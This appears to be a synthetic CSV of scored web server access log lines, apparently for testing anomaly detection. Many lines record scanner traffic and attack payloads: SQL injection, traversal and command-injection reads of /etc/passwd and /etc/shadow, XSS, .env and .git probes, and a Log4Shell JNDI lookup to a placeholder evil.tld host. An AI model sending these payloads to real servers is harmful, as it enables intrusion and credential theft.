score_content,score_session,score_fused,score_fused_norm,line
30124.95703125,,30124.95703125,30124.95703125,208.148.88.112 - - [10/Jan/2025:12:09:37 +0000] "GET /index.html HTTP/1.1" 404 1110 "https://twitter.com/" "sqlmap/1.7.2#stable"
30126.88671875,,30126.88671875,30126.88671875,130.113.239.118 - - [10/Jan/2025:12:09:37 +0000] "GET / HTTP/1.1" 404 434 "https://twitter.com/" "sqlmap/1.7.2#stable"
24.37483024597168,,24.37483024597168,24.37483024597168,69.244.41.64 - - [10/Jan/2025:12:09:39 +0000] "GET /search?q=laptop HTTP/1.1" 200 650 "https://www.google.com/" "dirb/2.22"
30227.57421875,,30227.57421875,30227.57421875,5.253.69.105 - - [10/Jan/2025:12:09:41 +0000] "TRACE /cgi-bin/test.cgi HTTP/1.1" 403 992 "-" "sqlmap/1.7.2#stable"
104.74858093261719,,104.74858093261719,104.74858093261719,61.24.237.89 - - [10/Jan/2025:12:09:43 +0000] "TRACE /profile HTTP/1.1" 200 9422 "-" "sqlmap/1.7.2#stable"
30.541088104248047,,30.541088104248047,30.541088104248047,216.18.153.81 - - [10/Jan/2025:12:09:43 +0000] "DELETE /logout HTTP/1.1" 301 3589 "https://twitter.com/" "curl/7.85.0"
30153.326171875,,30153.326171875,30153.326171875,22.190.232.186 - - [10/Jan/2025:12:09:44 +0000] "DELETE /api/products HTTP/1.1" 429 662 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
7.802331447601318,,7.802331447601318,7.802331447601318,163.109.20.249 - - [10/Jan/2025:12:09:45 +0000] "POST /about HTTP/1.1" 304 1375 "https://www.google.com/" "curl/7.85.0"
2.28578519821167,,2.28578519821167,2.28578519821167,184.36.17.11 - - [10/Jan/2025:12:09:47 +0000] "GET / HTTP/1.1" 200 9388 "https://twitter.com/" "python-requests/2.31.0"
24.430116653442383,,24.430116653442383,24.430116653442383,97.164.223.102 - - [10/Jan/2025:12:09:49 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 10745 "-" "dirb/2.22"
1.8977371454238892,,1.8977371454238892,1.8977371454238892,54.204.192.173 - - [10/Jan/2025:12:09:49 +0000] "GET /api/products HTTP/1.1" 201 3849 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.264822244644165,,2.264822244644165,2.264822244644165,64.195.44.219 - - [10/Jan/2025:12:09:50 +0000] "GET / HTTP/1.1" 200 5064 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
13.47576904296875,,13.47576904296875,13.47576904296875,194.235.232.114 - - [10/Jan/2025:12:09:51 +0000] "PUT /admin HTTP/1.1" 200 8208 "https://twitter.com/" "sqlmap/1.7.2#stable"
76.13729858398438,,76.13729858398438,76.13729858398438,116.78.39.119 - - [10/Jan/2025:12:09:51 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 301 19459 "-" "nikto/2.5.0"
30252.494140625,,30252.494140625,30252.494140625,125.81.114.221 - - [10/Jan/2025:12:09:53 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 429 1282 "https://twitter.com/" "nikto/2.5.0"
71.9227523803711,,71.9227523803711,71.9227523803711,128.162.239.82 - - [10/Jan/2025:12:09:56 +0000] "OPTIONS /.env HTTP/1.1" 200 12146 "https://www.google.com/" "dirb/2.22"
30148.537109375,,30148.537109375,30148.537109375,201.135.23.10 - - [10/Jan/2025:12:09:59 +0000] "GET /search?q=headphones HTTP/1.1" 401 512 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
127.04535675048828,,127.04535675048828,127.04535675048828,230.60.118.10 - - [10/Jan/2025:12:09:59 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 13966 "https://twitter.com/" "python-requests/2.31.0"
24.434032440185547,,24.434032440185547,24.434032440185547,188.112.229.39 - - [10/Jan/2025:12:10:01 +0000] "GET /api/product?id=123 HTTP/1.1" 200 9336 "https://news.ycombinator.com/" "curl/7.85.0"
27.70550537109375,,27.70550537109375,27.70550537109375,128.5.111.232 - - [10/Jan/2025:12:10:03 +0000] "DELETE /contact HTTP/1.1" 200 16693 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11087.2177734375,,11087.2177734375,11087.2177734375,114.218.196.174 - - [10/Jan/2025:12:10:03 +0000] "DELETE /search?q=monitor HTTP/1.1" 502 1167 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
27.277446746826172,,27.277446746826172,27.277446746826172,60.91.164.149 - - [10/Jan/2025:12:10:03 +0000] "POST /search?q=phone HTTP/1.1" 204 10827 "-" "sqlmap/1.7.2#stable"
4.914348602294922,,4.914348602294922,4.914348602294922,103.117.73.194 - - [10/Jan/2025:12:10:06 +0000] "POST /login HTTP/1.1" 200 8186 "-" "dirb/2.22"
0.23238371312618256,,0.23238371312618256,0.23238371312618256,56.200.243.79 - - [10/Jan/2025:12:10:08 +0000] "GET /assets/app.js HTTP/1.1" 200 3518 "https://www.google.com/" "python-requests/2.31.0"
127.18330383300781,,127.18330383300781,127.18330383300781,188.134.37.89 - - [10/Jan/2025:12:10:08 +0000] "TRACE /search?q=camera HTTP/1.1" 204 17363 "https://twitter.com/" "python-requests/2.31.0"
127.17196655273438,,127.17196655273438,127.17196655273438,21.172.93.55 - - [10/Jan/2025:12:10:09 +0000] "TRACE /search?q=camera HTTP/1.1" 200 12241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.437358856201172,,24.437358856201172,24.437358856201172,137.19.13.109 - - [10/Jan/2025:12:10:11 +0000] "GET /search?q=router HTTP/1.1" 200 19317 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30174.5703125,,30174.5703125,30174.5703125,21.177.129.244 - - [10/Jan/2025:12:10:13 +0000] "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 403 1370 "https://news.ycombinator.com/" "nikto/2.5.0"
127.07778930664062,,127.07778930664062,127.07778930664062,242.201.95.7 - - [10/Jan/2025:12:10:13 +0000] "TRACE /search?q=headphones HTTP/1.1" 204 9491 "https://example.com/" "sqlmap/1.7.2#stable"
30251.486328125,,30251.486328125,30251.486328125,172.106.193.132 - - [10/Jan/2025:12:10:13 +0000] "TRACE /search?q=router HTTP/1.1" 403 1353 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30170.75,,30170.75,30170.75,237.216.83.55 - - [10/Jan/2025:12:10:14 +0000] "HEAD /.env HTTP/1.1" 401 1249 "https://twitter.com/" "nikto/2.5.0"
27.346813201904297,,27.346813201904297,27.346813201904297,150.238.80.153 - - [10/Jan/2025:12:10:14 +0000] "GET /search?q=laptop HTTP/1.1" 304 18125 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11039.5302734375,,11039.5302734375,11039.5302734375,126.72.17.62 - - [10/Jan/2025:12:10:14 +0000] "GET / HTTP/1.1" 503 760 "https://news.ycombinator.com/" "curl/7.85.0"
103.08642578125,,103.08642578125,103.08642578125,212.141.106.128 - - [10/Jan/2025:12:10:16 +0000] "TRACE /.git/config HTTP/1.1" 200 15275 "https://twitter.com/" "sqlmap/1.7.2#stable"
50.03144454956055,,50.03144454956055,50.03144454956055,220.227.219.61 - - [10/Jan/2025:12:10:17 +0000] "DELETE /search?q=headphones HTTP/1.1" 200 13969 "https://www.google.com/" "nikto/2.5.0"
0.3467238247394562,,0.3467238247394562,0.3467238247394562,10.145.62.44 - - [10/Jan/2025:12:10:17 +0000] "GET /index.html HTTP/1.1" 200 9505 "https://www.google.com/" "dirb/2.22"
35.78466033935547,,35.78466033935547,35.78466033935547,135.184.13.170 - - [10/Jan/2025:12:10:17 +0000] "PUT /search?q=camera HTTP/1.1" 200 2946 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2937455475330353,,0.2937455475330353,0.2937455475330353,82.76.130.243 - - [10/Jan/2025:12:10:20 +0000] "GET /assets/app.js HTTP/1.1" 200 18185 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9217007160186768,,1.9217007160186768,1.9217007160186768,234.170.119.150 - - [10/Jan/2025:12:10:22 +0000] "GET /phpmyadmin HTTP/1.1" 200 16711 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.36748504638672,,24.36748504638672,24.36748504638672,95.152.244.220 - - [10/Jan/2025:12:10:24 +0000] "GET /search?q=monitor HTTP/1.1" 200 383 "-" "dirb/2.22"
127.12870788574219,,127.12870788574219,127.12870788574219,66.65.185.75 - - [10/Jan/2025:12:10:27 +0000] "TRACE /search?q=router HTTP/1.1" 200 763 "-" "python-requests/2.31.0"
103.03593444824219,,103.03593444824219,103.03593444824219,184.128.26.38 - - [10/Jan/2025:12:10:30 +0000] "TRACE /.git/config HTTP/1.1" 200 3848 "https://www.google.com/" "python-requests/2.31.0"
95.78775024414062,,95.78775024414062,95.78775024414062,111.20.157.165 - - [10/Jan/2025:12:10:32 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 8176 "https://example.com/" "curl/7.85.0"
27.67546272277832,,27.67546272277832,27.67546272277832,222.157.91.69 - - [10/Jan/2025:12:10:34 +0000] "DELETE /contact HTTP/1.1" 200 8843 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30124.849609375,,30124.849609375,30124.849609375,163.216.171.26 - - [10/Jan/2025:12:10:35 +0000] "GET /assets/app.css HTTP/1.1" 404 1343 "https://twitter.com/" "python-requests/2.31.0"
2.2564406394958496,,2.2564406394958496,2.2564406394958496,64.75.88.1 - - [10/Jan/2025:12:10:37 +0000] "GET / HTTP/1.1" 201 3866 "-" "sqlmap/1.7.2#stable"
127.12543487548828,,127.12543487548828,127.12543487548828,18.19.6.31 - - [10/Jan/2025:12:10:40 +0000] "TRACE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 13364 "-" "curl/7.85.0"
0.26309680938720703,,0.26309680938720703,0.26309680938720703,4.136.95.162 - - [10/Jan/2025:12:10:43 +0000] "GET /assets/app.css HTTP/1.1" 200 16374 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.570823669433594,,27.570823669433594,27.570823669433594,200.166.118.149 - - [10/Jan/2025:12:10:45 +0000] "DELETE /phpmyadmin HTTP/1.1" 200 7830 "-" "dirb/2.22"
0.27903348207473755,,0.27903348207473755,0.27903348207473755,80.92.190.230 - - [10/Jan/2025:12:10:47 +0000] "GET /assets/app.js HTTP/1.1" 200 13791 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
47.66997146606445,,47.66997146606445,47.66997146606445,230.203.11.43 - - [10/Jan/2025:12:10:47 +0000] "HEAD /profile HTTP/1.1" 200 11946 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
13.258515357971191,,13.258515357971191,13.258515357971191,75.242.237.19 - - [10/Jan/2025:12:10:48 +0000] "PUT /server-status HTTP/1.1" 200 19759 "https://twitter.com/" "curl/7.85.0"
95.68717956542969,,95.68717956542969,95.68717956542969,45.220.5.146 - - [10/Jan/2025:12:10:48 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 9836 "https://twitter.com/" "nikto/2.5.0"
104.68193054199219,,104.68193054199219,104.68193054199219,235.62.229.227 - - [10/Jan/2025:12:10:48 +0000] "TRACE /dashboard HTTP/1.1" 200 9814 "-" "curl/7.85.0"
127.26062774658203,,127.26062774658203,127.26062774658203,90.32.191.102 - - [10/Jan/2025:12:10:49 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 16114 "https://news.ycombinator.com/" "python-requests/2.31.0"
95.73688507080078,,95.73688507080078,95.73688507080078,82.18.151.30 - - [10/Jan/2025:12:10:49 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 201 16908 "-" "python-requests/2.31.0"
76.15879821777344,,76.15879821777344,76.15879821777344,125.4.245.47 - - [10/Jan/2025:12:10:50 +0000] "OPTIONS /dashboard HTTP/1.1" 301 16240 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.907155156135559,,1.907155156135559,1.907155156135559,220.6.173.65 - - [10/Jan/2025:12:10:52 +0000] "GET /dashboard HTTP/1.1" 200 5518 "-" "dirb/2.22"
126.9947738647461,,126.9947738647461,126.9947738647461,224.114.217.173 - - [10/Jan/2025:12:10:55 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 3034 "https://example.com/" "python-requests/2.31.0"
27.149290084838867,,27.149290084838867,27.149290084838867,94.69.16.228 - - [10/Jan/2025:12:10:56 +0000] "POST /search?q=headphones HTTP/1.1" 200 3452 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
30194.55078125,,30194.55078125,30194.55078125,179.253.116.242 - - [10/Jan/2025:12:10:58 +0000] "HEAD /search?q=headphones HTTP/1.1" 403 15 "https://news.ycombinator.com/" "dirb/2.22"
11087.0927734375,,11087.0927734375,11087.0927734375,174.120.207.109 - - [10/Jan/2025:12:10:59 +0000] "DELETE /search?q=monitor HTTP/1.1" 500 1199 "-" "Wget/1.21.2 (linux-gnu)"
127.22402954101562,,127.22402954101562,127.22402954101562,204.247.252.244 - - [10/Jan/2025:12:11:02 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 7100 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
70.13172149658203,,70.13172149658203,70.13172149658203,116.10.90.225 - - [10/Jan/2025:12:11:04 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 17119 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.298468828201294,,2.298468828201294,2.298468828201294,80.228.158.82 - - [10/Jan/2025:12:11:05 +0000] "GET / HTTP/1.1" 200 12489 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
73.2506332397461,,73.2506332397461,73.2506332397461,200.96.36.129 - - [10/Jan/2025:12:11:08 +0000] "OPTIONS /api/products HTTP/1.1" 201 3490 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
4.950642108917236,,4.950642108917236,4.950642108917236,43.159.241.69 - - [10/Jan/2025:12:11:09 +0000] "POST /about HTTP/1.1" 200 17754 "https://twitter.com/" "sqlmap/1.7.2#stable"
45.87632369995117,,45.87632369995117,45.87632369995117,50.108.157.50 - - [10/Jan/2025:12:11:10 +0000] "HEAD /../../etc/passwd HTTP/1.1" 200 15447 "https://www.google.com/" "curl/7.85.0"
95.708251953125,,95.708251953125,95.708251953125,44.248.220.134 - - [10/Jan/2025:12:11:11 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 3186 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.8924431800842285,,4.8924431800842285,4.8924431800842285,21.203.222.244 - - [10/Jan/2025:12:11:14 +0000] "GET /profile HTTP/1.1" 302 14679 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
50.032283782958984,,50.032283782958984,50.032283782958984,138.89.2.192 - - [10/Jan/2025:12:11:17 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 1027 "https://www.google.com/" "sqlmap/1.7.2#stable"
2.0003433227539062,,2.0003433227539062,2.0003433227539062,130.181.61.49 - - [10/Jan/2025:12:11:17 +0000] "GET /logout HTTP/1.1" 200 3308 "https://news.ycombinator.com/" "dirb/2.22"
95.81733703613281,,95.81733703613281,95.81733703613281,133.105.54.95 - - [10/Jan/2025:12:11:17 +0000] "OPTIONS /api/user?id=1;DROP TABLE users HTTP/1.1" 200 15575 "https://news.ycombinator.com/" "nikto/2.5.0"
30172.1640625,,30172.1640625,30172.1640625,174.67.94.224 - - [10/Jan/2025:12:11:18 +0000] "HEAD /profile HTTP/1.1" 401 549 "https://twitter.com/" "dirb/2.22"
0.33054614067077637,,0.33054614067077637,0.33054614067077637,39.197.245.68 - - [10/Jan/2025:12:11:20 +0000] "GET /index.html HTTP/1.1" 200 6077 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.290615051984787,,0.290615051984787,0.290615051984787,187.45.19.9 - - [10/Jan/2025:12:11:23 +0000] "GET /assets/app.js HTTP/1.1" 200 17192 "https://news.ycombinator.com/" "curl/7.85.0"
11.568233489990234,,11.568233489990234,11.568233489990234,165.58.207.73 - - [10/Jan/2025:12:11:24 +0000] "PUT /cgi-bin/test.cgi HTTP/1.1" 200 2213 "-" "python-requests/2.31.0"
4.929058074951172,,4.929058074951172,4.929058074951172,177.159.248.210 - - [10/Jan/2025:12:11:27 +0000] "GET /logout HTTP/1.1" 304 5379 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
95.77851867675781,,95.77851867675781,95.77851867675781,212.58.248.155 - - [10/Jan/2025:12:11:30 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 6297 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.28656005859375,,27.28656005859375,27.28656005859375,174.248.53.113 - - [10/Jan/2025:12:11:33 +0000] "POST /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 217 "-" "python-requests/2.31.0"
2.282804250717163,,2.282804250717163,2.282804250717163,84.38.92.241 - - [10/Jan/2025:12:11:35 +0000] "GET / HTTP/1.1" 200 8718 "https://www.google.com/" "dirb/2.22"
14.641765594482422,,14.641765594482422,14.641765594482422,98.243.90.249 - - [10/Jan/2025:12:11:35 +0000] "PUT /.git/config HTTP/1.1" 304 8626 "https://twitter.com/" "curl/7.85.0"
49.127296447753906,,49.127296447753906,49.127296447753906,39.215.185.42 - - [10/Jan/2025:12:11:35 +0000] "HEAD /.env HTTP/1.1" 304 6987 "https://www.google.com/" "nikto/2.5.0"
73.42013549804688,,73.42013549804688,73.42013549804688,75.89.67.81 - - [10/Jan/2025:12:11:36 +0000] "OPTIONS /login HTTP/1.1" 200 8476 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
72.84915924072266,,72.84915924072266,72.84915924072266,123.179.82.206 - - [10/Jan/2025:12:11:37 +0000] "HEAD /search?q=headphones HTTP/1.1" 301 9505 "https://www.google.com/" "python-requests/2.31.0"
0.20667704939842224,,0.20667704939842224,0.20667704939842224,213.244.119.169 - - [10/Jan/2025:12:11:37 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 13024 "-" "python-requests/2.31.0"
11.945284843444824,,11.945284843444824,11.945284843444824,14.244.98.198 - - [10/Jan/2025:12:11:40 +0000] "PUT /.env HTTP/1.1" 200 3833 "https://twitter.com/" "python-requests/2.31.0"
73.4063491821289,,73.4063491821289,73.4063491821289,68.111.181.190 - - [10/Jan/2025:12:11:40 +0000] "OPTIONS /login HTTP/1.1" 200 5670 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
50.106712341308594,,50.106712341308594,50.106712341308594,28.130.76.145 - - [10/Jan/2025:12:11:40 +0000] "DELETE /search?q=router HTTP/1.1" 200 13782 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
13.371329307556152,,13.371329307556152,13.371329307556152,68.206.204.129 - - [10/Jan/2025:12:11:40 +0000] "PUT /api/products HTTP/1.1" 200 18166 "https://www.google.com/" "dirb/2.22"
70.13044738769531,,70.13044738769531,70.13044738769531,174.190.106.152 - - [10/Jan/2025:12:11:40 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 6302 "https://news.ycombinator.com/" "nikto/2.5.0"
0.2307787835597992,,0.2307787835597992,0.2307787835597992,206.171.54.124 - - [10/Jan/2025:12:11:40 +0000] "GET /assets/app.js HTTP/1.1" 200 794 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11061.490234375,,11061.490234375,11061.490234375,232.176.205.85 - - [10/Jan/2025:12:11:41 +0000] "GET /search?q=phone HTTP/1.1" 500 1131 "https://twitter.com/" "curl/7.85.0"
95.74502563476562,,95.74502563476562,95.74502563476562,47.203.92.54 - - [10/Jan/2025:12:11:43 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 18842 "https://example.com/" "dirb/2.22"
72.8858413696289,,72.8858413696289,72.8858413696289,253.5.24.209 - - [10/Jan/2025:12:11:46 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 302 7733 "https://example.com/" "python-requests/2.31.0"
2.075566291809082,,2.075566291809082,2.075566291809082,208.218.124.237 - - [10/Jan/2025:12:11:49 +0000] "GET /admin HTTP/1.1" 200 10959 "https://twitter.com/" "curl/7.85.0"
27.619789123535156,,27.619789123535156,27.619789123535156,239.125.120.249 - - [10/Jan/2025:12:11:52 +0000] "DELETE /api/products HTTP/1.1" 200 11507 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
11.580437660217285,,11.580437660217285,11.580437660217285,203.247.195.216 - - [10/Jan/2025:12:11:53 +0000] "PUT /../../etc/passwd HTTP/1.1" 200 4679 "https://twitter.com/" "python-requests/2.31.0"
0.25649309158325195,,0.25649309158325195,0.25649309158325195,70.188.194.238 - - [10/Jan/2025:12:11:54 +0000] "GET /assets/app.css HTTP/1.1" 200 14439 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.76139831542969,,95.76139831542969,95.76139831542969,125.52.235.175 - - [10/Jan/2025:12:11:54 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 9434 "https://www.google.com/" "curl/7.85.0"
95.81233215332031,,95.81233215332031,95.81233215332031,161.104.240.27 - - [10/Jan/2025:12:11:55 +0000] "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 16998 "https://twitter.com/" "python-requests/2.31.0"
52.99380874633789,,52.99380874633789,52.99380874633789,16.139.160.79 - - [10/Jan/2025:12:11:58 +0000] "DELETE /search?q=router HTTP/1.1" 302 17598 "-" "Wget/1.21.2 (linux-gnu)"
25.985687255859375,,25.985687255859375,25.985687255859375,4.1.208.119 - - [10/Jan/2025:12:11:58 +0000] "DELETE /wp-login.php HTTP/1.1" 200 13237 "https://www.google.com/" "python-requests/2.31.0"
30174.48828125,,30174.48828125,30174.48828125,31.122.213.230 - - [10/Jan/2025:12:12:01 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 403 604 "-" "nikto/2.5.0"
30172.26953125,,30172.26953125,30172.26953125,107.221.182.138 - - [10/Jan/2025:12:12:04 +0000] "HEAD /about HTTP/1.1" 401 216 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11.694955825805664,,11.694955825805664,11.694955825805664,18.245.25.29 - - [10/Jan/2025:12:12:04 +0000] "PUT /.git/config HTTP/1.1" 200 2765 "-" "sqlmap/1.7.2#stable"
30.078327178955078,,30.078327178955078,30.078327178955078,162.190.241.187 - - [10/Jan/2025:12:12:06 +0000] "POST /search?q=camera HTTP/1.1" 301 3222 "https://twitter.com/" "nikto/2.5.0"
27.315330505371094,,27.315330505371094,27.315330505371094,240.20.82.145 - - [10/Jan/2025:12:12:09 +0000] "GET /search?q=ssd HTTP/1.1" 302 2461 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
104.83557891845703,,104.83557891845703,104.83557891845703,130.166.158.41 - - [10/Jan/2025:12:12:11 +0000] "TRACE /login HTTP/1.1" 200 12317 "-" "Wget/1.21.2 (linux-gnu)"
127.1053237915039,,127.1053237915039,127.1053237915039,16.106.222.134 - - [10/Jan/2025:12:12:14 +0000] "TRACE /search?q=monitor HTTP/1.1" 200 2825 "https://example.com/" "dirb/2.22"
35.882469177246094,,35.882469177246094,35.882469177246094,67.216.131.36 - - [10/Jan/2025:12:12:14 +0000] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 5102 "https://example.com/" "dirb/2.22"
0.21843329071998596,,0.21843329071998596,0.21843329071998596,38.201.111.11 - - [10/Jan/2025:12:12:15 +0000] "GET /assets/app.css HTTP/1.1" 200 456 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2811938524246216,,0.2811938524246216,0.2811938524246216,243.155.81.72 - - [10/Jan/2025:12:12:16 +0000] "GET /assets/app.js HTTP/1.1" 200 14394 "https://twitter.com/" "sqlmap/1.7.2#stable"
127.19800567626953,,127.19800567626953,127.19800567626953,153.142.166.114 - - [10/Jan/2025:12:12:16 +0000] "TRACE /search?q=camera HTTP/1.1" 200 19927 "-" "sqlmap/1.7.2#stable"
95.6786117553711,,95.6786117553711,95.6786117553711,36.252.149.143 - - [10/Jan/2025:12:12:16 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 306 "https://example.com/" "python-requests/2.31.0"
24.426729202270508,,24.426729202270508,24.426729202270508,221.243.164.58 - - [10/Jan/2025:12:12:19 +0000] "GET /search?q=camera HTTP/1.1" 200 15957 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
27.644325256347656,,27.644325256347656,27.644325256347656,106.226.6.208 - - [10/Jan/2025:12:12:22 +0000] "DELETE /api/products HTTP/1.1" 200 18523 "https://www.google.com/" "python-requests/2.31.0"
52.961326599121094,,52.961326599121094,52.961326599121094,236.165.222.177 - - [10/Jan/2025:12:12:23 +0000] "DELETE /api/product?id=123 HTTP/1.1" 302 934 "https://twitter.com/" "dirb/2.22"
70.27544403076172,,70.27544403076172,70.27544403076172,106.245.89.140 - - [10/Jan/2025:12:12:23 +0000] "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 16264 "https://example.com/" "dirb/2.22"
27.310766220092773,,27.310766220092773,27.310766220092773,222.74.67.59 - - [10/Jan/2025:12:12:24 +0000] "POST /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 3314 "https://example.com/" "dirb/2.22"
27.284727096557617,,27.284727096557617,27.284727096557617,184.88.34.155 - - [10/Jan/2025:12:12:24 +0000] "POST /search?q=camera HTTP/1.1" 200 17390 "https://example.com/" "python-requests/2.31.0"
